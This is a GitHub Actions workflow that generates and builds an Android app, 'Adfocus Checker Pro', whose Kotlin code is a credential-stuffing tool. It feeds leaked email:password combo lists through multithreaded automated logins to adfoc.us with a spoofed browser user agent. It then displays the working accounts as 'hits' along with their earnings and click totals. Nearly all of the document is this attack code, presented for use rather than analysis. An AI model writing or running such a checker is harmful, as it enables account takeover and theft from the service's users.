name: Build APK

on: workflow_dispatch

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-java@v4
        with:
          distribution: temurin
          java-version: "17"
      - uses: gradle/actions/setup-gradle@v4
        with:
          gradle-version: "8.7"

      - name: Generate project
        run: |
          mkdir -p app/src/main/java/com/stb/iptv \
                   app/src/main/res/values app/src/main/res/drawable

          cat > settings.gradle.kts <<'XEOF'
          pluginManagement {
              repositories { google(); mavenCentral(); gradlePluginPortal() }
          }
          dependencyResolutionManagement {
              repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS)
              repositories { google(); mavenCentral() }
          }
          rootProject.name = "StalkerIPTV"
          include(":app")
          XEOF

          cat > build.gradle.kts <<'XEOF'
          plugins {
              id("com.android.application") version "8.5.2" apply false
              id("org.jetbrains.kotlin.android") version "1.9.24" apply false
          }
          XEOF

          cat > gradle.properties <<'XEOF'
          org.gradle.jvmargs=-Xmx4096m -Dfile.encoding=UTF-8
          android.useAndroidX=true
          android.nonTransitiveRClass=true
          XEOF

          cat > app/build.gradle.kts <<'XEOF'
          plugins {
              id("com.android.application")
              id("org.jetbrains.kotlin.android")
          }
          android {
              namespace = "com.stb.iptv"
              compileSdk = 34
              defaultConfig {
                  applicationId = "com.stb.iptv"
                  minSdk = 24
                  targetSdk = 34
                  versionCode = 3
                  versionName = "3.0"
              }
              buildTypes { release { isMinifyEnabled = false } }
              compileOptions {
                  sourceCompatibility = JavaVersion.VERSION_17
                  targetCompatibility = JavaVersion.VERSION_17
              }
              kotlinOptions { jvmTarget = "17" }
              buildFeatures { compose = true }
              composeOptions { kotlinCompilerExtensionVersion = "1.5.14" }
          }
          dependencies {
              implementation("androidx.core:core-ktx:1.13.1")
              implementation("androidx.activity:activity-compose:1.9.0")
              implementation(platform("androidx.compose:compose-bom:2024.06.00"))
              implementation("androidx.compose.ui:ui")
              implementation("androidx.compose.material3:material3")
              implementation("com.squareup.okhttp3:okhttp:4.12.0")
              implementation("org.jetbrains.kotlinx:kotlinx-coroutines-android:1.8.1")
              implementation("androidx.media3:media3-exoplayer:1.4.1")
              implementation("androidx.media3:media3-ui:1.4.1")
              implementation("androidx.media3:media3-exoplayer-hls:1.4.1")
              implementation("androidx.media3:media3-exoplayer-dash:1.4.1")
              implementation("androidx.media3:media3-exoplayer-rtsp:1.4.1")
              implementation("androidx.media3:media3-datasource-okhttp:1.4.1")
          }
          XEOF

          cat > app/src/main/AndroidManifest.xml <<'XEOF'
          <?xml version="1.0" encoding="utf-8"?>
          <manifest xmlns:android="http://schemas.android.com/apk/res/android">
              <uses-permission android:name="android.permission.INTERNET" />
              <application
                  android:label="Adfocus Checker Pro"
                  android:usesCleartextTraffic="true"
                  android:theme="@style/Theme.App">
                  <activity android:name=".MainActivity" android:exported="true">
                      <intent-filter>
                          <action android:name="android.intent.action.MAIN" />
                          <category android:name="android.intent.category.LAUNCHER" />
                      </intent-filter>
                  </activity>
              </application>
          </manifest>
          XEOF

          cat > app/src/main/res/values/themes.xml <<'XEOF'
          <resources>
              <style name="Theme.App" parent="android:Theme.Material.NoActionBar">
                  <item name="android:windowBackground">#0B1020</item>
                  <item name="android:statusBarColor">#0B1020</item>
                  <item name="android:windowLightStatusBar">false</item>
              </style>
          </resources>
          XEOF

          cat > app/src/main/java/com/stb/iptv/AdfocusRepository.kt <<'XEOF'
          package com.stb.iptv

          import okhttp3.FormBody
          import okhttp3.Cookie
          import okhttp3.CookieJar
          import okhttp3.HttpUrl
          import okhttp3.OkHttpClient
          import okhttp3.Request
          import java.io.IOException
          import java.util.concurrent.TimeUnit

          data class AdfocusAccount(val email: String, val pass: String)
          data class AdfocusResult(
              val success: Boolean,
              val todayEarnings: String = "",
              val monthEarnings: String = "",
              val totalEarnings: String = "",
              val totalClicks: String = ""
          )

          class AdfocusRepository {
              private val cookieStore = mutableMapOf<String, List<Cookie>>()
              
              private val http = OkHttpClient.Builder()
                  .connectTimeout(15, TimeUnit.SECONDS)
                  .readTimeout(30, TimeUnit.SECONDS)
                  .cookieJar(object : CookieJar {
                      override fun saveFromResponse(url: HttpUrl, cookies: List<Cookie>) {
                          cookieStore[url.host] = cookies
                      }
                      override fun loadForRequest(url: HttpUrl): List<Cookie> {
                          return cookieStore[url.host] ?: emptyList()
                      }
                  })
                  .build()

              private val ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"

              private fun parseBetween(source: String, left: String, right: String): String {
                  val start = source.indexOf(left)
                  if (start == -1) return ""
                  val adjustedStart = start + left.length
                  val end = source.indexOf(right, adjustedStart)
                  if (end == -1) return ""
                  return source.substring(adjustedStart, end).replace("&nbsp;", " ").trim()
              }

              fun checkAccount(email: String, pass: String): AdfocusResult {
                  try {
                      // 1. GET Login Page
                      val getReq = Request.Builder()
                          .url("https://adfoc.us/session/create")
                          .header("User-Agent", ua)
                          .header("Pragma", "no-cache")
                          .header("Accept", "*/*")
                          .build()
                      
                      http.newCall(getReq).execute().close()

                      // 2. POST Login Request
                      val formBody = FormBody.Builder()
                          .add("email", email)
                          .add("password", pass)
                          .build()

                      val postReq = Request.Builder()
                          .url("https://adfoc.us/session/create")
                          .post(formBody)
                          .header("User-Agent", ua)
                          .header("Pragma", "no-cache")
                          .header("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
                          .header("Referer", "https://adfoc.us/")
                          .build()

                      http.newCall(postReq).execute().use { response ->
                          val html = response.body?.string().orEmpty()
                          
                          if (html.contains("/session/destroy")) {
                              val today = parseBetween(html, "<strong>Today's Earnings:</strong> ", " <strong>")
                              val month = parseBetween(html, "This Month's Earnings:</strong> ", " ")
                              val total = parseBetween(html, "Total Earnings:</strong> ", "<br/>")
                              val clicks = parseBetween(html, "Total Clicks:</strong> ", "</div>")
                              
                              return AdfocusResult(true, today, month, total, clicks)
                          }
                      }
                  } catch (e: Exception) {
                      e.printStackTrace()
                  }
                  return AdfocusResult(false)
              }
          }
          XEOF

          cat > app/src/main/java/com/stb/iptv/AdfocusScanner.kt <<'XEOF'
          package com.stb.iptv

          import java.util.concurrent.ConcurrentLinkedQueue
          import java.util.concurrent.CountDownLatch

          data class AdfocusHit(val email: String, val pass: String, val stats: String)

          object AdfocusScanner {
              fun scan(repo: AdfocusRepository, comboList: List<String>, threads: Int, onHit: (AdfocusHit) -> Unit, onDone: (Int) -> Unit) {
                  val queue = ConcurrentLinkedQueue<String>()
                  queue.addAll(comboList)
                  val total = comboList.size
                  val latch = CountDownLatch(threads)
                  
                  repeat(threads) {
                      Thread {
                          while (true) {
                              val item = queue.poll() ?: break
                              val parts = item.split(":", ",")
                              if (parts.size >= 2) {
                                  val email = parts[0].trim()
                                  val pass = parts[1].trim()
                                  val res = repo.checkAccount(email, pass)
                                  if (res.success) {
                                      val stats = "Today: ${res.todayEarnings} | Month: ${res.monthEarnings} | Total: ${res.totalEarnings} | Clicks: ${res.totalClicks}"
                                      onHit(AdfocusHit(email, pass, stats))
                                  }
                              }
                          }
                          latch.countDown()
                      }.start()
                  }
                  Thread { latch.await(); onDone(total) }.start()
              }
          }
          XEOF

          cat > app/src/main/java/com/stb/iptv/MainActivity.kt <<'XEOF'
          package com.stb.iptv

          import android.os.Bundle
          import androidx.activity.ComponentActivity
          import androidx.activity.compose.setContent
          import androidx.compose.foundation.background
          import androidx.compose.foundation.layout.*
          import androidx.compose.foundation.lazy.LazyColumn
          import androidx.compose.foundation.lazy.items
          import androidx.compose.material3.*
          import androidx.compose.runtime.*
          import androidx.compose.ui.Modifier
          import androidx.compose.ui.graphics.Brush
          import androidx.compose.ui.graphics.Color
          import androidx.compose.ui.unit.dp
          import kotlinx.coroutines.Dispatchers
          import kotlinx.coroutines.launch
          import kotlinx.coroutines.withContext

          val Bg1 = Color(0xFF0B1020); val Bg2 = Color(0xFF101A33)
          val Accent = Color(0xFF22C55E)

          class MainActivity : ComponentActivity() {
              override fun onCreate(savedInstanceState: Bundle?) {
                  super.onCreate(savedInstanceState)
                  setContent {
                      MaterialTheme(colorScheme = darkColorScheme(
                          primary = Accent, background = Bg1, surface = Bg1)) {
                          Surface(Modifier.fillMaxSize()) {
                              Column(Modifier.fillMaxSize().background(Brush
                                  .verticalGradient(listOf(Bg1, Bg2, Bg1)))) {
                                  MainScreen()
                              }
                          }
                      }
                  }
              }
          }

          @Composable
          fun MainScreen() {
              val repo = remember { AdfocusRepository() }
              val scope = rememberCoroutineScope()

              var singleEmail by remember { mutableStateOf("") }
              var singlePass by remember { mutableStateOf("") }
              var comboText by remember { mutableStateOf("") }
              var status by remember { mutableStateOf("idle") }
              var loading by remember { mutableStateOf(false) }
              var hits by remember { mutableStateOf(listOf<AdfocusHit>()) }

              fun checkSingle() {
                  scope.launch {
                      loading = true
                      status = "Checking single account..."
                      val res = withContext(Dispatchers.IO) { repo.checkAccount(singleEmail, singlePass) }
                      if (res.success) {
                          val stats = "Today: ${res.todayEarnings} | Month: ${res.monthEarnings} | Total: ${res.totalEarnings} | Clicks: ${res.totalClicks}"
                          hits = hits + AdfocusHit(singleEmail, singlePass, stats)
                          status = "Success!"
                      } else {
                          status = "Failed or Invalid credentials."
                      }
                      loading = false
                  }
              }

              fun startBulkScan() {
                  scope.launch {
                      loading = true
                      status = "Scanning bulk list..."
                      val list = comboText.lines().filter { it.contains(":") || it.contains(",") }
                      withContext(Dispatchers.IO) {
                          AdfocusScanner.scan(repo, list, 4, 
                              onHit = { h -> scope.launch { hits = hits + h } },
                              onDone = { scope.launch { status = "Scan finished."; loading = false } }
                          )
                      }
                  }
              }

              Column(Modifier.fillMaxSize().padding(14.dp),
                  verticalArrangement = Arrangement.spacedBy(10.dp)) {
                  Text("Adfocus Checker Pro", style = MaterialTheme.typography.headlineSmall, color = Accent)
                  Text(status, color = Color(0xFF8A8F98), style = MaterialTheme.typography.bodySmall)

                  OutlinedTextField(singleEmail, { singleEmail = it }, label = { Text("Email") }, modifier = Modifier.fillMaxWidth(), singleLine = true)
                  OutlinedTextField(singlePass, { singlePass = it }, label = { Text("Password") }, modifier = Modifier.fillMaxWidth(), singleLine = true)
                  
                  Button({ checkSingle() }, enabled = !loading, modifier = Modifier.fillMaxWidth()) {
                      Text("Check Account")
                  }

                  Spacer(Modifier.height(5.dp))

                  OutlinedTextField(
                      value = comboText,
                      onValueChange = { comboText = it },
                      label = { Text("Combo List (email:pass format)") },
                      modifier = Modifier.fillMaxWidth().height(120.dp)
                  )

                  Button({ startBulkScan() }, enabled = !loading, modifier = Modifier.fillMaxWidth()) {
                      Text("Start Bulk Scanner")
                  }

                  if (hits.isNotEmpty()) {
                      Text("Valid Hits:", color = Accent, style = MaterialTheme.typography.labelMedium)
                      LazyColumn(Modifier.weight(1f)) {
                          items(hits) { h ->
                              Card(Modifier.fillMaxWidth().padding(vertical = 4.dp)) {
                                  Column(Modifier.padding(8.dp)) {
                                      Text("${h.email}:${h.pass}", color = Color.White)
                                      Text(h.stats, color = Accent, style = MaterialTheme.typography.bodySmall)
                                  }
                              }
                          }
                      }
                  }
              }
          }
          XEOF

          echo "project generated"

      - name: Build debug APK
        run: gradle --no-daemon assembleDebug

      - uses: actions/upload-artifact@v4
        with:
          name: adfocus-checker-apk
          path: app/build/outputs/apk/debug/app-debug.apk
